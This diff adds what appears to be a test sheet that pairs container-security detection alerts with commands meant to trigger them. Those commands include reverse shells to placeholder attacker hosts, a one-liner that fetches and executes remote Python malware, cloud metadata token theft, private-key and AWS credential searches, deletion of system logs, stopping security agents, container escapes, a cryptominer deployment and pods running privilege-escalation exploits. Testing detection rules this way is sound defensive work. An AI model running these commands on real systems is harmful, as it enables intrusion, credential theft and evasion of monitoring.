@@ -1,0 +1,195 @@
+  
+1. Exploit-vsftpd
+------------------------------------------------------
+2. Credential access bash history'
+cat /.bash_history
+rm /.zsh_history
+------------------------------------------------------
+3. Cloud credentials accessed by network utility
+TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` \
+&& curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/
+------------------------------------------------------
+4. Crypto-mining-attack
+Deploy the  kubernet pod.yml
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: miner-test
+spec:
+  selector:
+    matchLabels:
+      app: miner-test
+  replicas: 1 # tells deployment to run 1 pods matching the template
+  template: # create pods using pod definition in this template
+    metadata:
+      labels:
+        app: miner-test
+    spec:
+      dnsConfig:
+        nameservers:
+          - 8.8.8.8
+      containers:
+      - name: miner-test
+        image: miningcontainers/xmrig:latest
+------------------------------------------------------
+5. Network-scanning-detected
+/usr/local/bin/pnscan -t512 -R 6f 73 3a 4c 69 6e 75 78 -W 2a 31 0d 0a 24 34 0d 0a 69 6e 66 6f 0d 0a 221.0.0.0/16 6379
+------------------------------------------------------
+6. Container-escape-cgroup
+unshare -UrmC bash
+mount -t cgroup -o memory cgroup /mnt
+------------------------------------------------------
+7. Container escape using runtime sockets
+curl -s --unix-socket /var/run/docker.sock -H "Content-Type: application/json" \
+-d '{"Image":"alpine","Cmd":["sh","-c","echo Hello from Alpine"],"AttachStdout":true,"AttachStderr":true}' \
+http://localhost/containers/create?name=alpine-from-api
+------------------------------------------------------
+Container escape using a mounted docker socket
+docker run --rm -it --privileged -v /:/mnt alpine chroot /mnt
+------------------------------------------------------
+Process hiding
+/usr/bin/sed -i s/evil_script.py/pnscan/g /var/tmp/.11/..lph/processhider.c
+------------------------------------------------------
+kills anti-malware processes
+service aliyun.service stop 
+service apparmor stop
+service bcm-agent stop
+service aegis stop 
+------------------------------------------------------
+clear system logs
+rm /var/log/syslog
+------------------------------------------------------
+Process hidden using mount
+mount -o bind /empty/dir /proc/42
+mount -o remount,hidepid=2 /proc
+
+------------------------------------------------------
+Detect curl Using Socks Proxy​
+curl -x socks4://proxy.example.com http://www.example.com/
+------------------------------------------------------
+Fileless Malware Detected​
+https://stackoverflow.com/questions/63208333/using-memfd-create-and-fexecve-to-run-elf-from-memory
+------------------------------------------------------
+Reverse shell detected
+nc -e /bin/sh attackers_ip attackers_port
+bash -i >& /dev/tcp/attackers_ip/attackers_port 0>&1
+
+In details:
+Inside container:
+//////////////////
+FROM alpine:latest
+
+# Install netcat (OpenBSD version for better compatibility)
+RUN apk add --no-cache netcat-openbsd
+
+# Set working dir
+WORKDIR /app
+
+# Run an example nc command (e.g., listen on port 8080)
+CMD ["nc", "-lk", "-p", "8080"]
+/////////////////
+docker build -t nc-server:latest .
+docker run --rm -p 8080:8080 nc-server:latest
+#from remote machine
+nc localhost 8080
+/////////////////
+apiVersion: v1
+kind: Pod
+metadata:
+  name: nc-server
+spec:
+  containers:
+  - name: nc
+    image: nc-server:latest
+    imagePullPolicy: Never
+    ports:
+    - containerPort: 8080
+
+
+------------------------------------------------------
+Steganografy tools detected
+steghide embed -cf -ef secret.txt test.jpg
+------------------------------------------------------
+Compiler executed in container
+gcc -o memfd-exec memfd-exec.c
+------------------------------------------------------
+Container management utility in container
+docker run --rm -it --privileged -v /:/mnt alpine chroot /mnt
+------------------------------------------------------
+Interactive shell spawned in container
+sh -i
+------------------------------------------------------
+Kubernetes service account token created in container
+kubectl create serviceaccount my-serviceaccount
+------------------------------------------------------
+Local account password modified
+passwd
+------------------------------------------------------
+Network utility executed
+tcpdump
+------------------------------------------------------
+Package installed in container
+apt install gdb
+------------------------------------------------------
+Python executed with suspicious arguments
+python -c 'import urllib.request; exec(urllib.request.urlopen("http://10.113.107.226:8000/malware.py").read())'
+------------------------------------------------------
+gdb executed In container
+gdb ./memfd-create
+------------------------------------------------------
+Insmod/modprobe executed In container
+modprobe br_netfilter
+------------------------------------------------------
+Sudo Potential Privilege Escalation
+pod.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+name: sudoedit-privesc
+spec:
+containers:
+- name: sudoedit-privesc
+  image: chenaotian/cve-2021-3156:latest
+  #imagePullPolicy: Never
+  command: ["sh"]
+  args: ['-c', 'cd ~/exp; su test; ./exp; whoami > whoami.txt']
+------------------------------------------------------
+Polkit Local Privilege Escalation
+pod.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: polkit-privesc
+spec:
+  containers:
+  - name: polkit-privesc
+    image: baconspider/cve-2021-4034:latest
+    imagePullPolicy: Never
+    command: ["sh"]
+    args: ['-c', './pwnkit']
+
+------------------------------------------------------
+Search Private Keys and Passwords
+find / -name id_rsa; grep "BEGIN RSA PRIVATE KEY" ~/.ssh/id_rsa; find /home -name id_ed25519; egrep "BEGIN OPENSSH PRIVATE KEY" ~/.ssh/id_ed25519; fgrep "BEGIN PRIVATE KEY" ~/.ssh/id_ecdsa
+------------------------------------------------------
+Debugfs Launched in Container
+command:
+debugfs
+------------------------------------------------------
+Find AWS Credentials
+grep aws_access_key_id ~/.aws/credentials; fgrep secretaccesskey somefile.txt; grep hello file.txt; grep aws_secret_access_key config.txt; find / -name .aws/credentials; mlocate .aws/credentials; locate secrets.txt
+------------------------------------------------------
+Schedule Cron Jobs
+#run start of the hour
+crontab -e
+0 * * * * /usr/bin/python /path/to/your/script.py
+------------------------------------------------------
+DB program spawned process --- to do
+mysqld -> whoami
+------------------------------------------------------
+Launch Remote File Copy Tools in Container
+scp test@10.113.107.226:/home/Downloads/test.png .
+------------------------------------------------------
+Launch Ingress Remote File Copy Tools in Container
+curl --location --request GET 'https://go.microsoft.com/fwlink/?linkid=2108834&Channel=Stable&language=en' --output foo.exe
+------------------------------------------------------
